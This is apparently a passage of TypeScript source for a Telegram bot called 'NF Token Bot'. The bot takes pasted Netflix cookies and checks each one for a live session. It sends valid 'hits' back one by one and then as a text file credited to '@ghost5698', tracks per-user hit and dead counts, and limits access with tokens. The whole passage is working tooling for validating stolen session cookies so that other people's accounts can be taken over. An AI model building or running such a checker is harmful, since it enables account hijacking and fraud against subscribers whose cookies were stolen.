      const cookies = parseCookiesFromText(cookieText);
      if (cookies.length === 0) {
        return bot.sendMessage(chatId, "❌ No valid cookies found.", { parse_mode: "HTML" });
      }

      if (access.usedToken) {
        await bot.sendMessage(chatId, `🎟️ Used 1 token. Remaining: ${storage.getTokens(String(userId))}`);
      }

      cancelled.delete(userId);
      const statusMsg = await bot.sendMessage(chatId,
        `🔴 Checking <b>${cookies.length}</b> Netflix cookie(s)...\n\n⏳ Please wait...\n\nType /cancel to stop`,
        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "❌ Cancel", callback_data: "cancel_check" }]] } }
      );

      let hits = 0;
      let dead = 0;
      let stopped = false;
      const nfHits: NFCheckResult[] = [];

      for (let i = 0; i < cookies.length; i++) {
        if (cancelled.has(userId)) { stopped = true; cancelled.delete(userId); break; }
        try {
          if (i > 0 && i % 5 === 0) {
            try {
              await bot.editMessageText(
                `🔴 Checking... ${i}/${cookies.length}\n\n✅ Hits: ${hits} | ❌ Dead: ${dead}\n\nType /cancel to stop`,
                { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "❌ Cancel", callback_data: "cancel_check" }]] } }
              );
            } catch {}
          }

          const result = await checkNetflixCookie(cookies[i]);
          if (result.success && result.token) {
            hits++;
            nfHits.push(result);
            await bot.sendMessage(chatId, formatNFHit(result, hits), { parse_mode: "HTML", disable_web_page_preview: true });
          } else {
            dead++;
          }
        } catch { dead++; }
      }

      storage.addDailyChecks(String(userId), stopped ? hits + dead : cookies.length);
      for (let i = 0; i < hits; i++) storage.addHit(String(userId));
      for (let i = 0; i < dead; i++) storage.addDead(String(userId));

      try {
        await bot.editMessageText(
          `${stopped ? "⛔ <b>Cancelled!</b>" : "✅ <b>Netflix Check Complete!</b>"}\n${"─".repeat(25)}\n\n📊 Checked: ${hits + dead}/${cookies.length}\n✅ Hits: ${hits}\n❌ Dead: ${dead}`,
          { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
        );
      } catch {}

      if (nfHits.length > 0) {
        let fileContent = `Netflix Hits - ${new Date().toLocaleString()}\nChecked by @ghost5698\n${"═".repeat(40)}\n\n`;
        nfHits.forEach((h, i) => { fileContent += formatNFHitPlain(h, i + 1) + "\n"; });
        fileContent += `${"═".repeat(40)}\nTotal Hits: ${nfHits.length}\nChecked by @ghost5698`;
        const buf = Buffer.from(fileContent, "utf8");
        await bot.sendDocument(chatId, buf, { caption: `🔴 ${nfHits.length} Netflix Hits | by @ghost5698` }, { filename: `netflix_hits_${Date.now()}.txt`, contentType: "text/plain" });
      }

      delete pending[userId];
      return;
    }
  });

  bot.on("polling_error", (err) => {
    console.error("Bot polling error:", err.message);
  });

  console.log("✅ NF Token Bot is running!");
}
